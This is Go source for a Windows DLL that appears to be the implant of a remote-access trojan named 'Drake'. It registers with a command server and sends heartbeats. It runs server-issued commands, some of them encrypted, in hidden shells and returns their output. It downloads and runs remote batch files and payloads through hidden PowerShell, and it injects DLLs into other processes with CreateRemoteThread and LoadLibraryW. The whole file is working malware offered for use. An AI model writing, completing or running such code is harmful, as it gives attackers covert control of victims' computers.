			if logFile, err2 := os.OpenFile("drake_dll_autostart.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644); err2 == nil {
				logFile.WriteString(fmt.Sprintf("[%s] Connection failed, retrying in 10 seconds: %v\n", time.Now().Format("15:04:05"), err))
				logFile.Close()
			}
			time.Sleep(10 * time.Second)
			continue
		}
	}
}

func (c *Client) runWithReconnect() error {
	for {
		if err := c.register(); err != nil {
			if logFile, err2 := os.OpenFile("drake_dll_autostart.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644); err2 == nil {
				logFile.WriteString(fmt.Sprintf("[%s] Registration failed, retrying in 5 seconds: %v\n", time.Now().Format("15:04:05"), err))
				logFile.Close()
			}
			time.Sleep(5 * time.Second)
			continue
		}
		break
	}

	go c.heartbeatLoop()

	return c.taskLoop()
}

func (c *Client) heartbeatLoop() {
	for {
		if err := c.sendHeartbeat(); err != nil {
			if logFile, err2 := os.OpenFile("drake_dll_autostart.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644); err2 == nil {
				logFile.WriteString(fmt.Sprintf("[%s] Heartbeat failed: %v\n", time.Now().Format("15:04:05"), err))
				logFile.Close()
			}
		} else {
			if logFile, err2 := os.OpenFile("drake_dll_autostart.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644); err2 == nil {
				logFile.WriteString(fmt.Sprintf("[%s] Heartbeat sent successfully\n", time.Now().Format("15:04:05")))
				logFile.Close()
			}
		}
		time.Sleep(10 * time.Second)
	}
}

func (c *Client) taskLoop() error {
	lastHeartbeat := time.Now()

	for {
		if time.Since(lastHeartbeat) > 30*time.Second {
			if err := c.sendHeartbeat(); err == nil {
				lastHeartbeat = time.Now()
				if logFile, err2 := os.OpenFile("drake_dll_autostart.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644); err2 == nil {
					logFile.WriteString(fmt.Sprintf("[%s] Extra heartbeat sent during task loop\n", time.Now().Format("15:04:05")))
					logFile.Close()
				}
			}
		}

		tasks, err := c.getTasks()
		if err != nil {
			fmt.Printf("[ERROR] Failed to get tasks: %v\n", err)
			time.Sleep(5 * time.Second)
			continue
		}

		for _, task := range tasks {
			if err := c.processTask(task); err != nil {
				fmt.Printf("[ERROR] Error processing task: %v\n", err)
			}
		}
		time.Sleep(3 * time.Second)
	}
}

func (c *Client) createRequest(method, path string, body []byte) (*http.Request, error) {
	url := fmt.Sprintf("%s%s", c.serverURL, path)
	var req *http.Request
	var err error

	if body != nil {
		req, err = http.NewRequest(method, url, bytes.NewBuffer(body))
	} else {
		req, err = http.NewRequest(method, url, nil)
	}

	if err != nil {
		return nil, err
	}

	req.Header.Set("User-Agent", c.userAgent)
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", c.authToken))
	req.Header.Set("X-Build-ID", c.buildID)

	return req, nil
}

func (c *Client) register() error {

	if debugLog, err := os.OpenFile("C:\\temp\\drake_dll_debug.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644); err == nil {
		debugLog.WriteString("[+] Starting registration process\n")
		debugLog.Close()
	}

	req, err := c.createRequest("GET", fmt.Sprintf("/register?id=%s", c.buildID), nil)
	if err != nil {
		if debugLog, err2 := os.OpenFile("C:\\temp\\drake_dll_debug.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644); err2 == nil {
			debugLog.WriteString(fmt.Sprintf("[-] Failed to create request: %v\n", err))
			debugLog.Close()
		}
		return err
	}

	if debugLog, err2 := os.OpenFile("C:\\temp\\drake_dll_debug.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644); err2 == nil {
		debugLog.WriteString(fmt.Sprintf("[+] Making request to: %s\n", req.URL.String()))
		debugLog.Close()
	}

	resp, err := c.httpClient.Do(req)
	if err != nil {
		if debugLog, err2 := os.OpenFile("C:\\temp\\drake_dll_debug.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644); err2 == nil {
			debugLog.WriteString(fmt.Sprintf("[-] HTTP request failed: %v\n", err))
			debugLog.Close()
		}
		return err
	}
	defer resp.Body.Close()

	if debugLog, err2 := os.OpenFile("C:\\temp\\drake_dll_debug.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644); err2 == nil {
		debugLog.WriteString(fmt.Sprintf("[+] HTTP response status: %d\n", resp.StatusCode))
		debugLog.Close()
	}

	if resp.StatusCode != http.StatusOK {
		if debugLog, err2 := os.OpenFile("C:\\temp\\drake_dll_debug.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644); err2 == nil {
			debugLog.WriteString(fmt.Sprintf("[-] Registration failed with status: %d\n", resp.StatusCode))
			debugLog.Close()
		}
		return fmt.Errorf("registration failed with status: %d", resp.StatusCode)
	}

	if debugLog, err2 := os.OpenFile("C:\\temp\\drake_dll_debug.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644); err2 == nil {
		debugLog.WriteString("[+] Registration successful\n")
		debugLog.Close()
	}

	return nil
}

func (c *Client) sendHeartbeat() error {
	req, err := c.createRequest("GET", fmt.Sprintf("/heartbeat?id=%s", c.buildID), nil)
	if err != nil {
		return err
	}

	req.Header.Set("X-Timestamp", fmt.Sprintf("%d", time.Now().Unix()))

	resp, err := c.httpClient.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("heartbeat failed with status: %d", resp.StatusCode)
	}

	body, _ := io.ReadAll(resp.Body)
	if logFile, err2 := os.OpenFile("drake_dll_autostart.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644); err2 == nil {
		logFile.WriteString(fmt.Sprintf("[%s] Heartbeat response: %s\n", time.Now().Format("15:04:05"), string(body)))
		logFile.Close()
	}

	return nil
}

func (c *Client) decryptCommand(encryptedCommand string) (string, error) {
	data, err := base64.StdEncoding.DecodeString(encryptedCommand)
	if err != nil {
		return "", fmt.Errorf("failed to decode base64: %v", err)
	}

	if len(data) < 12 {
		return "", fmt.Errorf("encrypted data too short")
	}
	iv := data[:12]
	ciphertext := data[12:]

	h := sha256.New()
	h.Write([]byte(c.buildID))
	key := h.Sum(nil)

	block, err := aes.NewCipher(key)
	if err != nil {
		return "", fmt.Errorf("failed to create cipher: %v", err)
	}

	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		return "", fmt.Errorf("failed to create GCM: %v", err)
	}

	plaintext, err := aesGCM.Open(nil, iv, ciphertext, nil)
	if err != nil {
		return "", fmt.Errorf("failed to decrypt: %v", err)
	}

	return string(plaintext), nil
}

func (c *Client) getTasks() ([]string, error) {
	req, err := c.createRequest("GET", fmt.Sprintf("/tasks?id=%s", c.buildID), nil)
	if err != nil {
		return nil, err
	}

	resp, err := c.httpClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("failed to get tasks: %d", resp.StatusCode)
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("failed to read response body: %v", err)
	}

	var taskObjects []map[string]interface{}
	if err := json.Unmarshal(body, &taskObjects); err == nil {
		tasks := make([]string, len(taskObjects))
		for i, task := range taskObjects {
			command, ok := task["command"].(string)
			if !ok {
				continue
			}
			isEncrypted, _ := task["isEncrypted"].(bool)
			taskData := map[string]interface{}{
				"command":     command,
				"isEncrypted": isEncrypted,
			}
			taskJSON, err := json.Marshal(taskData)
			if err != nil {
				fmt.Printf("[ERROR] Failed to marshal task data: %v\n", err)
				continue
			}
			tasks[i] = string(taskJSON)
		}
		return tasks, nil
	}

	var stringTasks []string
	if err := json.Unmarshal(body, &stringTasks); err != nil {
		return nil, fmt.Errorf("failed to parse tasks response: %v", err)
	}

	return stringTasks, nil
}

func (c *Client) processTask(task string) error {
	taskHash := fmt.Sprintf("%x", sha256.Sum256([]byte(task)))

	now := time.Now()
	for hash, timestamp := range c.taskHistory {
		if now.Sub(timestamp) > 5*time.Second {
			delete(c.taskHistory, hash)
		}
	}

	if lastExec, exists := c.taskHistory[taskHash]; exists {
		if now.Sub(lastExec) < 2*time.Second {
			fmt.Printf("[DEBUG] Ignoring duplicate task received within 2 seconds\n")
			return nil
		}
	}

	c.taskHistory[taskHash] = now

	fmt.Printf("[DEBUG] Received task: %s\n", task)

	var taskData struct {
		Command     string `json:"command"`
		IsEncrypted bool   `json:"isEncrypted"`
	}

	var output string

	if err := json.Unmarshal([]byte(task), &taskData); err != nil {
		fmt.Printf("[DEBUG] Not a JSON task, executing as plain command\n")
		output = c.executeTask(task)
	} else {
		fmt.Printf("[DEBUG] Parsed task - Command: %s, Encrypted: %v\n", taskData.Command, taskData.IsEncrypted)

		var command string
		if taskData.IsEncrypted {
			fmt.Printf("[DEBUG] Decrypting command...\n")
			decrypted, err := c.decryptCommand(taskData.Command)
			if err != nil {
				output = fmt.Sprintf("Failed to decrypt command: %v", err)
			} else {
				command = decrypted
				fmt.Printf("[DEBUG] Decrypted command: %s\n", command)
				output = c.executeTask(command)
			}
		} else {
			command = taskData.Command
			output = c.executeTask(command)
		}
	}

	fmt.Printf("[DEBUG] Task execution completed with output:\n%s\n", output)

	return c.sendTaskResult(output)
}

func (c *Client) sendTaskResult(output string) error {
	result := map[string]interface{}{
		"id":        c.buildID,
		"output":    output,
		"timestamp": time.Now().Unix(),
	}

	jsonData, err := json.Marshal(result)
	if err != nil {
		return fmt.Errorf("failed to marshal result: %v", err)
	}

	req, err := c.createRequest("POST", "/result", jsonData)
	if err != nil {
		return fmt.Errorf("failed to create request: %v", err)
	}

	req.Header.Set("Content-Type", "application/json")

	resp, err := c.httpClient.Do(req)
	if err != nil {
		return fmt.Errorf("failed to send result: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("server returned status %d", resp.StatusCode)
	}

	fmt.Printf("[DEBUG] Result sent successfully to server\n")
	return nil
}

func (c *Client) executeTask(task string) string {

	if strings.HasPrefix(task, "plugin:") {
		parts := strings.SplitN(task, ":", 3)
		if len(parts) >= 2 {
			pluginName := parts[1]
			command := ""
			if len(parts) == 3 {
				command = parts[2]
			}

			result, err := pluginManager.ExecutePlugin(pluginName, command)
			if err != nil {
				return fmt.Sprintf("Plugin error: %v", err)
			}
			return result
		}
		return "Invalid plugin command format. Use: plugin:name:command"
	}

	switch task {
	case "plugins:list":
		plugins, err := pluginManager.ListAvailablePlugins()
		if err != nil {
			return fmt.Sprintf("Error listing plugins: %v", err)
		}
		return fmt.Sprintf("Available plugins: %s", strings.Join(plugins, ", "))

	case "plugins:loaded":
		var loaded []string
		for name := range pluginManager.loadedPlugins {
			loaded = append(loaded, name)
		}
		return fmt.Sprintf("Loaded plugins: %s", strings.Join(loaded, ", "))

	case "plugins:unload:all":
		pluginManager.UnloadAllPlugins()
		return "All plugins unloaded"
	}

	if strings.HasPrefix(task, "plugins:unload:") {
		pluginName := strings.TrimPrefix(task, "plugins:unload:")
		err := pluginManager.UnloadPlugin(pluginName)
		if err != nil {
			return fmt.Sprintf("Error unloading plugin %s: %v", pluginName, err)
		}
		return fmt.Sprintf("Plugin %s unloaded", pluginName)
	}

	if strings.HasPrefix(task, "http://") || strings.HasPrefix(task, "https://") {
		fmt.Printf("[DEBUG] Detected direct URL execution: %s\n", task)
		tempDir := os.TempDir()
		tempFile := filepath.Join(tempDir, fmt.Sprintf("dr4ke_%d.bat", time.Now().UnixNano()))
		fmt.Printf("[DEBUG] Created temp file: %s\n", tempFile)

		if err := c.downloadFileTo(task, tempFile); err != nil {
			return fmt.Sprintf("Failed to download file: %v", err)
		}
		fmt.Printf("[DEBUG] File downloaded successfully\n")

		output := c.executeBatchFile(tempFile)
		os.Remove(tempFile)
		fmt.Printf("[DEBUG] Temp file cleaned up\n")
		return output
	}

	if strings.Contains(task, ":") {
		cmdParts := strings.SplitN(task, ":", 2)
		command := cmdParts[0]
		remainder := cmdParts[1]

		fmt.Printf("[DEBUG] Processing special command: %s with args: %s\n", command, remainder)

		switch command {
		case "cd":
			return c.changeDirectory(remainder)

		case "execute":
			colonIndex := strings.Index(remainder, ":")
			if colonIndex == -1 {
				return "Missing file type and URL arguments"
			}

			fileType := strings.TrimSpace(remainder[:colonIndex])
			url := strings.TrimSpace(remainder[colonIndex+1:])

			fmt.Printf("[DEBUG] Executing file - Type: %s, URL: %s\n", fileType, url)

			if fileType != "bat" {
				return "Only .bat files are supported for execution"
			}

			tempDir := os.TempDir()
			tempFile := filepath.Join(tempDir, fmt.Sprintf("dr4ke_%d.bat", time.Now().UnixNano()))
			fmt.Printf("[DEBUG] Created temp file: %s\n", tempFile)

			if err := c.downloadFileTo(url, tempFile); err != nil {
				return fmt.Sprintf("Failed to download file: %v", err)
			}
			fmt.Printf("[DEBUG] File downloaded successfully\n")

			output := c.executeBatchFile(tempFile)
			os.Remove(tempFile)
			fmt.Printf("[DEBUG] Temp file cleaned up\n")
			return output

		case "drop":
			lastColonIndex := strings.LastIndex(remainder, ":")
			if lastColonIndex == -1 {
				return "Missing file type, URL, and destination arguments"
			}

			dest := strings.TrimSpace(remainder[lastColonIndex+1:])

			firstColonIndex := strings.Index(remainder[:lastColonIndex], ":")
			if firstColonIndex == -1 {
				return "Missing file type and URL"
			}

			fileType := strings.TrimSpace(remainder[:firstColonIndex])
			url := strings.TrimSpace(remainder[firstColonIndex+1 : lastColonIndex])

			fmt.Printf("[DEBUG] Dropping file - Type: %s, URL: %s, Destination: %s\n", fileType, url, dest)

			if fileType != "bat" {
				return "Only .bat files are supported for dropping"
			}

			var destDir string
			if dest == "%TEMP%" {
				destDir = os.TempDir()
			} else {
				destDir = os.ExpandEnv(strings.ReplaceAll(dest, "%", "$"))
			}

			fmt.Printf("[DEBUG] Resolved destination directory: %s\n", destDir)

			if err := os.MkdirAll(destDir, 0755); err != nil {
				return fmt.Sprintf("Failed to create destination directory: %v", err)
			}

			filename := fmt.Sprintf("dr4ke_%d.bat", time.Now().UnixNano())
			destPath := filepath.Join(destDir, filename)
			fmt.Printf("[DEBUG] Full destination path: %s\n", destPath)

			if err := c.downloadFileTo(url, destPath); err != nil {
				return fmt.Sprintf("Failed to download file: %v", err)
			}
			fmt.Printf("[DEBUG] File downloaded successfully to: %s\n", destPath)

			output := c.executeBatchFile(destPath)
			return fmt.Sprintf("File dropped to %s and executed:\n%s", destPath, output)
		}
	}

	fmt.Printf("[DEBUG] Executing shell command: %s\n", task)
	return c.executeShellCommand(task)
}

func (c *Client) downloadFileTo(url string, destPath string) error {
	resp, err := c.httpClient.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("bad status: %s", resp.Status)
	}

	destFile, err := os.Create(destPath)
	if err != nil {
		return err
	}
	defer destFile.Close()

	_, err = io.Copy(destFile, resp.Body)
	return err
}

func (c *Client) executeBatchFile(path string) string {
	if runtime.GOOS != "windows" {
		return "Batch files are only supported on Windows"
	}

	cmd := exec.Command("cmd", "/C", "start", "/MIN", "cmd", "/C", path)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		CreationFlags: syscall.CREATE_NEW_PROCESS_GROUP,
	}

	err := cmd.Start()
	if err != nil {
		return fmt.Sprintf("Failed to start batch file: %v", err)
	}

	return fmt.Sprintf("Batch file started in background: %s", path)
}

func (c *Client) executeShellCommand(command string) string {
	guiCommands := []string{"calc", "notepad", "mspaint", "explorer", "taskmgr", "regedit", "msconfig"}
	longCommands := []string{"ping -t", "netstat -an", "tasklist /fo"}

	cmdLower := strings.ToLower(command)
	cmdParts := strings.Fields(command)

	if len(cmdParts) == 0 {
		return "Empty command"
	}

	firstCmd := strings.ToLower(cmdParts[0])

	if firstCmd == "upload" {
		if len(cmdParts) != 2 {
			return "Usage: upload [URL]\nExample: upload https://example.com/payload.dll"
		}
		return c.executeUpload(cmdParts[1])
	}

	if firstCmd == "uploads" {
		return c.listUploads()
	}

	if strings.ToLower(cmdParts[0]) == "dllinject" {
		if len(cmdParts) != 3 {
			return "Usage: dllinject [process-name] [dll-path]\nExample: dllinject notepad.exe payload.dll"
		}
		return c.executeDllInject(cmdParts[1], cmdParts[2])
	}

	if firstCmd == "pslist" {
		return c.listProcesses()
	}

	for _, guiCmd := range guiCommands {
		if firstCmd == guiCmd {
			return c.executeGUICommand(command)
		}
	}

	isLongCommand := false
	for _, longCmd := range longCommands {
		if strings.Contains(cmdLower, longCmd) {
			isLongCommand = true
			break
		}
	}

	if isLongCommand {
		return c.executeWithTimeout(command, 10*time.Second)
	}

	return c.executeNormalCommand(command)
}

func (c *Client) executeUpload(url string) string {

	if !strings.HasPrefix(strings.ToLower(url), "http://") && !strings.HasPrefix(strings.ToLower(url), "https://") {
		return "Invalid URL. Must start with http:// or https://"
	}

	parts := strings.Split(url, "/")
	filename := parts[len(parts)-1]
	if filename == "" || !strings.Contains(filename, ".") {
		return "Cannot determine filename from URL. URL must end with filename.ext"
	}

	tempDir := filepath.Join(os.TempDir(), "dr4ke_uploads")
	if err := os.MkdirAll(tempDir, 0755); err != nil {
		return fmt.Sprintf("Failed to create upload directory: %v", err)
	}

	filePath := filepath.Join(tempDir, filename)

	psCommand := fmt.Sprintf(`Invoke-WebRequest -Uri "%s" -OutFile "%s" -UseBasicParsing`, url, filePath)

	cmd := exec.Command("powershell", "-Command", psCommand)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("Download failed: %v\nOutput: %s", err, string(output))
	}

	if _, err := os.Stat(filePath); os.IsNotExist(err) {
		return fmt.Sprintf("File was not downloaded: %s", filePath)
	}

	fileInfo, err := os.Stat(filePath)
	if err != nil {
		return fmt.Sprintf("Error reading file info: %v", err)
	}

	return fmt.Sprintf("File downloaded successfully!\nPath: %s\nSize: %d bytes (%s)\nSource: %s",
		filePath,
		fileInfo.Size(),
		c.formatFileSize(fileInfo.Size()),
		url)
}

func (c *Client) formatFileSize(size int64) string {
	const unit = 1024
	if size < unit {
		return fmt.Sprintf("%d B", size)
	}
	div, exp := int64(unit), 0
	for n := size / unit; n >= unit; n /= unit {
		div *= unit
		exp++
	}
	return fmt.Sprintf("%.1f %cB", float64(size)/float64(div), "KMGTPE"[exp])
}

func (c *Client) listUploads() string {
	tempDir := filepath.Join(os.TempDir(), "dr4ke_uploads")

	if _, err := os.Stat(tempDir); os.IsNotExist(err) {
		return "No uploads directory found. Use 'upload [URL]' to download files first."
	}

	files, err := os.ReadDir(tempDir)
	if err != nil {
		return fmt.Sprintf("Error reading uploads directory: %v", err)
	}

	if len(files) == 0 {
		return "Uploads directory is empty. Use 'upload [URL]' to download files."
	}

	result := "Downloaded Files:\n"
	result += "-------------------------------------------------------------\n"

	for _, file := range files {
		if file.IsDir() {
			continue
		}

		filePath := filepath.Join(tempDir, file.Name())
		fileInfo, err := os.Stat(filePath)
		if err != nil {
			continue
		}

		result += fmt.Sprintf("%s (%s) - %s\n",
			file.Name(),
			c.formatFileSize(fileInfo.Size()),
			fileInfo.ModTime().Format("2006-01-02 15:04:05"))
	}

	result += "-------------------------------------------------------------\n"
	result += fmt.Sprintf("Directory: %s", tempDir)

	return result
}

func (c *Client) listProcesses() string {
	cmd := exec.Command("wmic", "process", "get", "name,processid,parentprocessid", "/format:csv")
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("Failed to list processes: %v", err)
	}
	return string(output)
}

func (c *Client) executeDllInject(targetProcess, dllPath string) string {
	if runtime.GOOS != "windows" {
		return "DLL injection is only supported on Windows"
	}

	if !filepath.IsAbs(dllPath) {
		tempDir := filepath.Join(os.TempDir(), "dr4ke_uploads")
		fullPath := filepath.Join(tempDir, dllPath)

		if _, err := os.Stat(fullPath); err == nil {
			dllPath = fullPath
		}
	}

	if _, err := os.Stat(dllPath); os.IsNotExist(err) {
		return fmt.Sprintf("DLL file not found: %s\nTip: Use 'upload https://example.com/payload.dll' first", dllPath)
	}

	pid, err := c.findProcessByName(targetProcess)
	if err != nil {
		return fmt.Sprintf("Process not found: %s", targetProcess)
	}

	err = c.injectDLL(pid, dllPath)
	if err != nil {
		return fmt.Sprintf("DLL injection failed: %v", err)
	}

	return fmt.Sprintf("DLL successfully injected!\nTarget: %s (PID: %d)\nDLL: %s", targetProcess, pid, dllPath)
}

func (c *Client) findProcessByName(processName string) (uint32, error) {
	cmd := exec.Command("wmic", "process", "where", fmt.Sprintf("name='%s'", processName), "get", "processid", "/value")
	output, err := cmd.CombinedOutput()
	if err != nil {
		return 0, err
	}

	lines := strings.Split(string(output), "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "ProcessId=") {
			pidStr := strings.TrimPrefix(line, "ProcessId=")
			if pid, err := strconv.ParseUint(pidStr, 10, 32); err == nil && pid > 0 {
				return uint32(pid), nil
			}
		}
	}

	return 0, fmt.Errorf("process not found")
}

func (c *Client) injectDLL(pid uint32, dllPath string) error {
	dllPathUTF16, err := syscall.UTF16FromString(dllPath)
	if err != nil {
		return err
	}

	kernel32, err := syscall.LoadDLL("kernel32.dll")
	if err != nil {
		return fmt.Errorf("failed to load kernel32.dll: %v", err)
	}
	defer kernel32.Release()

	openProcess, err := kernel32.FindProc("OpenProcess")
	if err != nil {
		return fmt.Errorf("failed to find OpenProcess: %v", err)
	}

	virtualAllocEx, err := kernel32.FindProc("VirtualAllocEx")
	if err != nil {
		return fmt.Errorf("failed to find VirtualAllocEx: %v", err)
	}

	writeProcessMemory, err := kernel32.FindProc("WriteProcessMemory")
	if err != nil {
		return fmt.Errorf("failed to find WriteProcessMemory: %v", err)
	}

	createRemoteThread, err := kernel32.FindProc("CreateRemoteThread")
	if err != nil {
		return fmt.Errorf("failed to find CreateRemoteThread: %v", err)
	}

	getModuleHandle, err := kernel32.FindProc("GetModuleHandleW")
	if err != nil {
		return fmt.Errorf("failed to find GetModuleHandleW: %v", err)
	}

	getProcAddressLocal, err := kernel32.FindProc("GetProcAddress")
	if err != nil {
		return fmt.Errorf("failed to find GetProcAddress: %v", err)
	}

	closeHandle, err := kernel32.FindProc("CloseHandle")
	if err != nil {
		return fmt.Errorf("failed to find CloseHandle: %v", err)
	}

	hProcess, _, _ := openProcess.Call(
		PROCESS_ALL_ACCESS,
		0,
		uintptr(pid),
	)
	if hProcess == 0 {
		return fmt.Errorf("failed to open process (Access Denied or PID not found)")
	}
	defer closeHandle.Call(hProcess)

	dllPathSize := len(dllPathUTF16) * 2
	allocAddr, _, _ := virtualAllocEx.Call(
		hProcess,
		0,
		uintptr(dllPathSize),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_READWRITE,
	)
	if allocAddr == 0 {
		return fmt.Errorf("failed to allocate memory in target process")
	}

	var bytesWritten uintptr
	ret, _, _ := writeProcessMemory.Call(
		hProcess,
		allocAddr,
		uintptr(unsafe.Pointer(&dllPathUTF16[0])),
		uintptr(dllPathSize),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		return fmt.Errorf("failed to write DLL path to target process")
	}
	kernel32DllStr, _ := syscall.UTF16PtrFromString("kernel32.dll")
	hKernel32, _, _ := getModuleHandle.Call(uintptr(unsafe.Pointer(kernel32DllStr)))
	if hKernel32 == 0 {
		return fmt.Errorf("failed to get kernel32.dll handle")
	}

	loadLibraryStr, _ := syscall.BytePtrFromString("LoadLibraryW")
	loadLibraryAddr, _, _ := getProcAddressLocal.Call(hKernel32, uintptr(unsafe.Pointer(loadLibraryStr)))
	if loadLibraryAddr == 0 {
		return fmt.Errorf("failed to get LoadLibraryW address")
	}

	hThread, _, _ := createRemoteThread.Call(
		hProcess,
		0,
		0,
		loadLibraryAddr,
		allocAddr,
		0,
		0,
	)
	if hThread == 0 {
		return fmt.Errorf("failed to create remote thread")
	}
	defer closeHandle.Call(hThread)

	return nil
}

func (c *Client) executeWithTimeout(command string, timeout time.Duration) string {
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()

	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmdPath := filepath.Join(os.Getenv("SystemRoot"), "System32", "cmd.exe")
		if _, err := os.Stat(cmdPath); err != nil {
			cmdPath = "cmd"
		}
		cmd = exec.CommandContext(ctx, cmdPath, "/C", command)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	} else {
		cmd = exec.CommandContext(ctx, "sh", "-c", command)
	}

	output, err := cmd.CombinedOutput()

	if ctx.Err() == context.DeadlineExceeded {
		return fmt.Sprintf("Command timed out after %v:\n%s\n\n📄 Partial output:\n%s", timeout, command, string(output))
	}

	if err != nil {
		return fmt.Sprintf("Error: %v\n📄 Output: %s", err, string(output))
	}

	return string(output)
}

func (c *Client) changeDirectory(dir string) string {
	if err := os.Chdir(dir); err != nil {
		return fmt.Sprintf("Failed to change directory: %v", err)
	}
	cwd, err := os.Getwd()
	if err != nil {
		return "Changed directory but failed to get new working directory"
	}
	return fmt.Sprintf("Changed to directory: %s", cwd)
}

func (c *Client) executeGUICommand(command string) string {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmdPath := filepath.Join(os.Getenv("SystemRoot"), "System32", "cmd.exe")
		if _, err := os.Stat(cmdPath); err != nil {
			cmdPath = "cmd"
		}
		cmd = exec.Command(cmdPath, "/C", "start", "", command)
		cmd.SysProcAttr = &syscall.SysProcAttr{
			HideWindow: true,
		}
	} else {
		cmd = exec.Command("nohup", "sh", "-c", command, "&")
	}

	err := cmd.Start()
	if err != nil {
		return fmt.Sprintf("Error starting GUI application: %v", err)
	}

	return fmt.Sprintf("GUI application started successfully: %s", command)
}

func (c *Client) executeNormalCommand(command string) string {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmdPath := filepath.Join(os.Getenv("SystemRoot"), "System32", "cmd.exe")
		if _, err := os.Stat(cmdPath); err != nil {
			cmdPath = "cmd"
		}
		cmd = exec.Command(cmdPath, "/C", command)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	} else {
		cmd = exec.Command("sh", "-c", command)
	}

	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("Error: %v\nOutput: %s", err, string(output))
	}

	return string(output)
}

func StartClient(serverURL *C.char, authToken *C.char, buildID *C.char) C.int {
	initOnce.Do(func() {
		go autoStart()
	})

	goServerURL := C.GoString(serverURL)
	goAuthToken := C.GoString(authToken)
	goBuildID := C.GoString(buildID)

	if logFile, err := os.OpenFile("drake_dll_autostart.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644); err == nil {
		logFile.WriteString(fmt.Sprintf("[%s] Manual StartClient called: %s\n", time.Now().Format("15:04:05"), goServerURL))
		logFile.Close()
	}

	globalClient = NewClient(goServerURL, goAuthToken, goBuildID)

	go func() {
		if err := globalClient.Run(); err != nil {
			if logFile, err2 := os.OpenFile("drake_dll_autostart.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644); err2 == nil {
				logFile.WriteString(fmt.Sprintf("[%s] Manual client error: %v\n", time.Now().Format("15:04:05"), err))
				logFile.Close()
			}
		}
	}()

	return 1
}

func StopClient() C.int {
	if logFile, err := os.OpenFile("drake_dll_autostart.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644); err == nil {
		logFile.WriteString(fmt.Sprintf("[%s] StopClient called\n", time.Now().Format("15:04:05")))
		logFile.Close()
	}
	globalClient = nil
	return 1
}

func ExecuteCommand(command *C.char) *C.char {
	if globalClient == nil {
		return C.CString("Client not initialized")
	}

	goCommand := C.GoString(command)
	result := globalClient.executeShellCommand(goCommand)

	return C.CString(result)
}

func GetClientStatus() *C.char {
	if globalClient == nil {
		return C.CString("Client not initialized")
	}

	status := fmt.Sprintf("Client Status: Active\nServer URL: %s\nBuild ID: %s",
		globalClient.serverURL, globalClient.buildID)

	return C.CString(status)
}

/*
func TestDLL() C.int {
	// Simple test function to verify DLL is working
	if logFile, err := os.Create("drake_dll_test_function.log"); err == nil {
		logFile.WriteString(fmt.Sprintf("[%s] TestDLL function called successfully!\n", time.Now().Format("15:04:05")))
		logFile.WriteString(fmt.Sprintf("[%s] Auto-started: %v\n", time.Now().Format("15:04:05"), isStarted))
		logFile.Close()
	}
	return 1
}
*/

func main() {}
